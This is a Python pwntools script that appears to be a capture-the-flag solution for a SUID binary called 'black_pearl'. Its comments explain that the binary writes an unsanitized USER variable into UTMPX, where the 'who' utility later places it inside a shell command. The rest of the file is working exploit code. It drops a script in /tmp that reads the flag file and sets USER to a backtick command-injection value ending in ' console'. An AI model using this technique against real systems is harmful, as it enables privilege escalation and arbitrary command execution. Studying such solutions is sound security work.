#!/usr/bin/env python3
#
#  Solution
#  --------
#  1. The SUID binary takes the USER environment variable and uses pututxline() to write it to UTMPX
#  2. Since USER is not sanitized - we have the ability to write an arbitrary entry to UTMPX
#  3. The "who" utility reads the UTMPX entry by entry and for each entry
#  4. For each entry it looks for "console" - if found - it will take everything before the first space
#  5. The chomped entry is used as such: "/usr/bin/id -u $user"
#  6. Therefore - we can introduce a command injection - the only issue is that we have to do it without spaces
#
from pwn import *
import os

# Temporary file path
TMP_PATH = '/tmp/prl.sh'

# The command we wish to run
CMD = '/bin/cat /Users/ctf/flag'

# Drop command to a temporary file
with open(TMP_PATH, 'w') as fp:
    fp.write('#!/bin/sh\n')
    fp.write(CMD)
os.chmod(TMP_PATH, 0o755)

# Set up the username to cause a command injection and a fake "console"
my_env = {}
my_env |= os.environ
my_env['USER'] = f'`{TMP_PATH}` console'

# Start the target
proc = process('/Users/ctf/black_pearl', env=my_env)
proc.interactive()

